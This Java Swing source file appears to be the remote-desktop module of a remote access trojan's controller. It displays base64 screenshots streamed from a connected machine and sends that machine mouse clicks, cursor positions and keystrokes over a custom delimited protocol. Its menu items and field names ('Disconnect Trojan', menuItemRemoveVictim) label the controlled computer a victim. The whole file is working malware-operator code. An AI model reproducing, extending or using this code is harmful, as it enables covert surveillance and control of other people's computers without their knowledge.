package New;

import java.awt.BorderLayout;
import java.awt.Checkbox;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.InputEvent;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.ArrayList;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;

public class Desktop_VB{
	private  JFrame form ;
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem menuItem_Run_File;
    private  JMenuItem Refresh_menuitem;
    private  JMenuItem menuItemDesktop;
    private  JMenuItem menuItemRemoveVictim;
    private JLabel screen;
	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
	private  JTextArea Dir ;
	private  JButton btnNext ;
	private int Width_t = 0;
	private int Height_t = 0;
	private     KeyAdapter  Key_listener ;
	private int Start=0;
	private Checkbox remote_mouse_sc = new Checkbox("Control Mouse");  
    private boolean control_mouse = false;
	private Checkbox remote_key_sc = new Checkbox("Control Keyboard"); 
    private boolean control_key = false;
	public Desktop_VB(String ip,int Width_t , int Height_t){
		this.sock = ip;
		this.Width_t = Width_t;
		this.Height_t = Height_t;
		this.Do_frame();
		this.command();
		this.Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t);
		this.Dir.repaint();
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public String Get_sock(){
		return sock ;
	}
	public void command(){
		
		  sock = title.replace("Remote Desktop Manager For : "  , "");
		//Master.Send_Data("@" + Exe_Split + "0" + Exe_Split + "0" + Exe_Split + "100"+ Exe_Ending,sock);
		//Master.Send_Data("getdrives" + Exe_Split + Exe_Ending,sock);
	}
 
 
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	 private static  ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  String convertSize(float iSize)
	 {
	   if (iSize <= 0.0F) {
	     return "0";
	   }
	   
	   String[] units = { "Bytes", "KB", "MB", "GB", "TB" };
	   int digitGroups = (int)(Math.log10(iSize) / Math.log10(1024.0D));
	   
	   return new java.text.DecimalFormat("#,##0.#")
	     .format(iSize / Math.pow(1024.0D, digitGroups)) + 
	     " " + units[digitGroups];
	 }
	public  void Perform_data(String Received){
	 
		 form.repaint();
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		//  System.out.println("here          " + Received );
			if (Received.isEmpty()==false){
			  
					Received = Received.replace("c2x2824x828200x0c", YY);
					
					  switch (SplitString(Received).get(0)){
					  
					  case "@":
						  
						  String endcoded = SplitString(Received).get(2);
						  
						//  new MessageBox().infoBox("from " + sock, "");
						  Image Rec_img = null;
						  try{
							  byte[] imageBytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(endcoded);
							  BufferedImage img = ImageIO.read(new ByteArrayInputStream(imageBytes));
							  Rec_img = img;
							  screen.setIcon(new ImageIcon(new javax.swing.ImageIcon(Rec_img).getImage().getScaledInstance(screen.getWidth(), screen.getHeight(), Image.SCALE_SMOOTH)));
							
							  screen.repaint();
							  if(Start ==1){
									btnNext.setText("Stop");
									btnNext.repaint();
									form.validate();
									 
								      
									screen.setFocusable(true);
									screen.requestFocus();
									screen.requestFocusInWindow();
									// form.add(sp);
									screen.validate();
									if(control_mouse==true){
										try{
											
											double x_ratio = (double) this.Width_t / screen.getWidth();
											double y_ratio = (double) this.Height_t / screen.getHeight();
											int form_x = screen.getMousePosition().x ;
											 double tar_x = (double)form_x * x_ratio;//screen.getMousePosition().x * x_ratio;
											 double tar_y = (double) screen.getMousePosition().y * y_ratio;
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Enabled" + "\n" + "Request : Refresh Screen");
										  
											  Master.Send_Data("$" + Exe_Split + (int)tar_x  + Exe_Split + (int)tar_y + Exe_Split + Exe_Ending,sock,false);
											
										}catch(Exception ex){
											System.out.println("ex"+"\n" + ex.getMessage());
										}
										
										}else{
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Disabled" + "\n" + "Request : Refresh Screen");
										}
									
								  Master.Send_Data("@" + Exe_Split + sp.getWidth()  + Exe_Split+ sp.getHeight()  + Exe_Split + "0" + Exe_Split + "100"+ Exe_Ending,sock,false);
								  
									
								}else{
									System.out.println("i not sent");
								}
						  }catch(Exception ex){
						
						  }
				 
						 
						     sp.updateUI();
							 form.repaint();
						  
						  break;
				 
					  }
					
				 
					
				
			}
				
		
	}
	public  void Do_frame(){
		 form = new JFrame();
		 form.setName("Remote Desktop Manager For : " + sock);
		 form.setTitle("Remote Desktop Manager For : " + sock);
		 title = "Remote Desktop Manager For : "+ sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 Dir = new JTextArea("");
		 Dir.setBounds(5, 5, 485, 65);
		 remote_mouse_sc.addItemListener(new ItemListener() {  
		     	@Override
		          public void itemStateChanged(ItemEvent e) {               
		           if( e.getStateChange() ==1){
		         	  control_mouse = true;
		           }else{
		         	  control_mouse = false;
		         	 
		           }
		           
		          }

					 
		       });  
		     
		     remote_mouse_sc.setFont(font);
		     remote_mouse_sc.setForeground(Color.WHITE);
		 	remote_mouse_sc.setBounds(80, 75, 100, 23);
		 	
		 	
		 	     remote_key_sc.addItemListener(new ItemListener() {  
		     	@Override
		          public void itemStateChanged(ItemEvent e) {               
		           if( e.getStateChange() ==1){
		        	   control_key = true;
		           }else{
		        	   control_key = false;
		         	 
		           }
		           
		          }

					 
		       });  
		 	remote_key_sc.setFont(font);
		 	remote_key_sc.setForeground(Color.WHITE);
		 	remote_key_sc.setBounds(190, 75, 150, 23);
		 	
		 	
		 	
		 btnNext = new JButton("Start");
			btnNext.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					//do here some stuff
					//System.out.println(sock);
					if(Start ==1){
						Start = 0;
						btnNext.setText("Start");
						btnNext.repaint();
						form.validate();
						return;
					}else{
						Start = 1;
						Master.Send_Data("@" + Exe_Split + sp.getWidth()  + Exe_Split+ sp.getHeight()  + Exe_Split + "0" + Exe_Split + "100"+ Exe_Ending,sock,false);
						btnNext.setText("Stop");
						btnNext.repaint();
						form.validate();
					}
					
				}
			});
			btnNext.setBounds(5, 75, 70, 23);
			
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			JPopupMenu popupMenu = new JPopupMenu();
		     menuItem_Run_File = new JMenuItem("Run");  
		     Refresh_menuitem = new JMenuItem("Delete");
		     menuItemDesktop = new JMenuItem("Delete");
			menuItemRemoveVictim = new JMenuItem("Disconnect Trojan");
			
			popupMenu.add(menuItem_Run_File);
			popupMenu.add(Refresh_menuitem);
			popupMenu.add(menuItemDesktop);
			popupMenu.add(menuItemRemoveVictim);
			
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"^.^","Drive / File / Folder", "Type / Ext.", "Size"}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	     
	        
	      
	      
			
	        btnNext.setFont(font);
			Dir.setFont(font);
			Dir.setEditable(false);
			 
			
			
			
			
		    form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			        Master.Remove_Form_Desktop_VB(sock);
			    	 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close Remote Desktop Manager "+ sock +" window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			    
			        } 
			    }
			}); 
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
		  
		//	 form.add(btnNext);
			// form.add(Dir);
		   		screen = new JLabel();
		   		screen.setBounds(5, 100, 485, 290); 
		        sp = new JScrollPane(screen); 
		       
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		        Buttons.add(btnNext); Buttons.add(Dir);
		      Buttons.add(remote_mouse_sc);
			    Buttons.add(remote_key_sc);	    
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, Buttons,sp );
				   
				    split.setDividerSize(10);
				    split.setDividerLocation(100);
				    split.setOneTouchExpandable(true);
				 
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(100);
				        	Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	screen.setSize((form.getWidth() - form.getWidth()/4), 200);
				        	 
				         
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
				      MouseListener mouseListener = new MouseAdapter() {
				            public void mousePressed(MouseEvent mouseEvent) {
				                int modifiers = mouseEvent.getModifiers();
				                if ((modifiers & InputEvent.BUTTON1_MASK) == InputEvent.BUTTON1_MASK) {
				                	if(control_mouse==true){
										try{
											
											double x_ratio = (double) Width_t / screen.getWidth();
											double y_ratio = (double) Height_t / screen.getHeight();
											int form_x = screen.getMousePosition().x ;
											 double tar_x = (double)form_x * x_ratio;//screen.getMousePosition().x * x_ratio;
											 double tar_y = (double) screen.getMousePosition().y * y_ratio;
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Enabled" + "\n" + "Request : Refresh Screen");
										  
											  Master.Send_Data("#" + Exe_Split + (int)tar_x  + Exe_Split + (int)tar_y + Exe_Split + "pres-l" + "|" + Exe_Split  + Exe_Ending,sock,false);
											
										}catch(Exception ex){
											System.out.println("ex"+"\n" + ex.getMessage());
										}
										
										}
				                   
				                }
				                if ((modifiers & InputEvent.BUTTON2_MASK) == InputEvent.BUTTON2_MASK) {
				                    //System.out.println("Middle button pressed.");
				                	if(control_mouse==true){
										try{
											
											double x_ratio = (double) Width_t / screen.getWidth();
											double y_ratio = (double) Height_t / screen.getHeight();
											int form_x = screen.getMousePosition().x ;
											 double tar_x = (double)form_x * x_ratio;//screen.getMousePosition().x * x_ratio;
											 double tar_y = (double) screen.getMousePosition().y * y_ratio;
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Enabled" + "\n" + "Request : Refresh Screen");
										  
											  Master.Send_Data("#" + Exe_Split + (int)tar_x  + Exe_Split + (int)tar_y + Exe_Split + "middle-p" + "|" + Exe_Split  + Exe_Ending,sock,false);
											
										}catch(Exception ex){
											System.out.println("ex"+"\n" + ex.getMessage());
										}
										
										}
				                }
				                if ((modifiers & InputEvent.BUTTON3_MASK) == InputEvent.BUTTON3_MASK) {
				                	if(control_mouse==true){
										try{
											
											double x_ratio = (double) Width_t / screen.getWidth();
											double y_ratio = (double) Height_t / screen.getHeight();
											int form_x = screen.getMousePosition().x ;
											 double tar_x = (double)form_x * x_ratio;//screen.getMousePosition().x * x_ratio;
											 double tar_y = (double) screen.getMousePosition().y * y_ratio;
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Enabled" + "\n" + "Request : Refresh Screen");
										  
											  Master.Send_Data("#" + Exe_Split + (int)tar_x  + Exe_Split + (int)tar_y + Exe_Split + "pres-r" + "|" + Exe_Split  + Exe_Ending,sock,false);
											
										}catch(Exception ex){
											System.out.println("ex"+"\n" + ex.getMessage());
										}
										
										}
				                }
				            }

				            public void mouseReleased(MouseEvent mouseEvent) {
				                if (SwingUtilities.isLeftMouseButton(mouseEvent)) {
				                	if(control_mouse==true){
										try{
											
											double x_ratio = (double) Width_t / screen.getWidth();
											double y_ratio = (double) Height_t / screen.getHeight();
											int form_x = screen.getMousePosition().x ;
											 double tar_x = (double)form_x * x_ratio;//screen.getMousePosition().x * x_ratio;
											 double tar_y = (double) screen.getMousePosition().y * y_ratio;
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Enabled" + "\n" + "Request : Refresh Screen");
										  
											  Master.Send_Data("#" + Exe_Split + (int)tar_x  + Exe_Split + (int)tar_y + Exe_Split + "rels-l" + "|" + Exe_Split  + Exe_Ending,sock,false);
											
										}catch(Exception ex){
											System.out.println("ex"+"\n" + ex.getMessage());
										}
										
										}
				                }
				                if (SwingUtilities.isMiddleMouseButton(mouseEvent)) {
				                  //  System.out.println("Middle button released.");
				                	if(control_mouse==true){
										try{
											
											double x_ratio = (double) Width_t / screen.getWidth();
											double y_ratio = (double) Height_t / screen.getHeight();
											int form_x = screen.getMousePosition().x ;
											 double tar_x = (double)form_x * x_ratio;//screen.getMousePosition().x * x_ratio;
											 double tar_y = (double) screen.getMousePosition().y * y_ratio;
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Enabled" + "\n" + "Request : Refresh Screen");
										  
											  Master.Send_Data("#" + Exe_Split + (int)tar_x  + Exe_Split + (int)tar_y + Exe_Split + "middle-r" + "|" + Exe_Split  + Exe_Ending,sock,false);
											
										}catch(Exception ex){
											System.out.println("ex"+"\n" + ex.getMessage());
										}
										
										}
				                }
				                if (SwingUtilities.isRightMouseButton(mouseEvent)) {
				                	if(control_mouse==true){
										try{
											
											double x_ratio = (double) Width_t / screen.getWidth();
											double y_ratio = (double) Height_t / screen.getHeight();
											int form_x = screen.getMousePosition().x ;
											 double tar_x = (double)form_x * x_ratio;//screen.getMousePosition().x * x_ratio;
											 double tar_y = (double) screen.getMousePosition().y * y_ratio;
											 Dir.setText("Client Screen Size : Width :- "+Width_t+" Height :- " + Height_t + "\n" + "Mouse Control Enabled" + "\n" + "Request : Refresh Screen");
										  
											  Master.Send_Data("#" + Exe_Split + (int)tar_x  + Exe_Split + (int)tar_y + Exe_Split + "rels-r" + "|" + Exe_Split  + Exe_Ending,sock,false);
											
										}catch(Exception ex){
											System.out.println("ex"+"\n" + ex.getMessage());
										}
										
										}
				                }
				                System.out.println();
				            }
				        };
				        screen.addMouseListener(mouseListener);

				        Key_listener = new KeyAdapter() {
							
							@Override
							public void keyTyped(KeyEvent e) {
								// TODO Auto-generated method stub
								 
							}
							
							@Override
							public void keyReleased(KeyEvent e) {
								// TODO Auto-generated method stub
								 
							}
							
							@Override
							public void keyPressed(KeyEvent e) {
								// TODO Auto-generated method stub
								
								 if (control_key ==true){
							 
									screen.setFocusable(true);
									screen.requestFocus();
									screen.requestFocusInWindow();
									// form.add(sp);
									screen.validate();
								  Master.Send_Data("code" + Exe_Split + e.getKeyCode() + Exe_Split + Exe_Ending,sock,false);
								  return;
								 }
							}
						};
						screen.addKeyListener(Key_listener);
		     
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			
	}
	
	 
  
	
	
}

